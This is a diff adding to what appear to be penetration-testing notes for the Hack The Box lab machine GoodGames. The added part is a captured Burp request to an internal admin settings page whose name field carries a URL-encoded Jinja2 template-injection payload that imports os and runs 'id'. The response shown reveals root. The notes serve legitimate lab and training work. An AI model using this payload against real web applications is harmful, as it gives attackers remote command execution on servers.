@@ -926,3 +926,23 @@ Table: user
 
 http://internal-administration.goodgames.htb/settings - profile input returns "49" when `{{7*7}}` is entered into the name field.
 
+_Burp Request_
+```
+POST /settings HTTP/1.1
+Host: internal-administration.goodgames.htb
+Content-Length: 117
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://internal-administration.goodgames.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://internal-administration.goodgames.htb/settings
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljktOBDEMBe-SNYvEv3bmMi3bsQVCAql7ZoW4O5HY1avNq5921pX3e3s8r1e-tfNjtUc7oFwhMNyS6xiEBrS8V1-91EthBKuWqIrV4tU5aXiSibp4hjvYqo6aIMAsmgtr4xDuAGO6TRp4IHkcyTi4z-qCpsmzitoOed15_deMPeO-6nx-f-bXFgyYSNOiA6VWHNNFtOY-97moAiyWD2u_fzwQQBA.Y6yIMg.JLNfPtFg1GrUQOZWAzokl8xXdEY
+Connection: close
+
+name=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D
+```
+Response in body provides `uid=0(root) gid=0(root) groups=0(root)`
